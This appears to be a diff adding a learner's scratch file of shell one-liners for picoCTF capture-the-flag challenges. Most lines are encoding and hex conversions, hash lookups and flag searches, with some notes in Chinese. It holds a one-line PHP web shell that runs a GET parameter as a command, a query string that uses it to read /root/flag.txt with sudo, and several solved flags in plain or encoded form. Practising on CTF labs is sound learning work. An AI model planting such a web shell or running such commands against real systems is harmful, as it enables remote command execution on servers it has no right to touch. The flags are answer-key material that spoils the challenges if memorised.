@@ -1,0 +1,60 @@
+echo -n "灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸彥㜰㍢㐸㙽" | iconv -f UTF-8 -t UTF-16BE | xxd -p
+echo 7069636f4354467b31365f626974735f696e73743334645f6f665f385f65
+373033623438367d | xxd -r -p
+
+echo -n "灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸彥㜰㍢㐸㙽" | iconv -f UTF-8 -t UTF-16BE | xxd -p | xxd -r -p
+echo "obase=16; 42" | bc
+echo $((16#1000))
+
+
+printf '%X\n' 42      # 輸出: 2A 16進制
+printf '%o\n' 42      # 輸出: 52 8進制
+
+sha256sum files/* | grep
+
+
+sha256sum files/* | grep 03b52eabed517324828b9e09cbbf8a7b0911f348f76cf989ba6d51acede6d5d8
+
+sha256sum files/* | grep 55b983afdd9d10718f1db3983459efc5cc3f5a66841e2651041e25dec3efd46
+
+files/2cdcb2de
+./decrypt.sh files/2cdcb2de
+
+
+grep -ri "pico" ~/kok/CTF/Tab, Tab, Attack
+grep -ri "pico" "~/kok/CTF/Tab, Tab, Attack"
+grep -ri "pico" "$HOME/kok/CTF/Tab, Tab, Attack"
+grep -ria "pico" "$HOME/kok/CTF/Tab, Tab, Attack"
+
+
+?cmd=sudo cat /root/flag.txt
+
+
+1. $_GET['cmd'] 是什麼？
+這是 PHP 的超全域變數，代表網址中的 GET 參數
+
+
+<?php system($_GET['cmd']); ?>
+整行意思變成：
+system("ls");
+
+
+echo "112 105 99 111" | awk '{for(i=1;i<=NF;i++) printf "%c", $i; print ""}'
+
+
+/tmp是公用資料夾  大部分 用戶可以讀取
+
+
+
+echo $((0x133d - 0x12a7))  #進行16位計算輸出10位結果
+
+
+printf "0x%X\n" $((0x133d - 0x12a7))  #進行16位計算輸出16位結果
+
+printf "0x%X\n" $((0x58beea76833d - 0x96))
+
+echo -e "picoCTF{gl17ch_m3_n07_\x61\x34\x33\x39\x32\x64\x32\x65}"
+
+echo -n "a haunted house" | md5sum
+
+grep -ri "pico" ~/kok/CTF/First\ Find
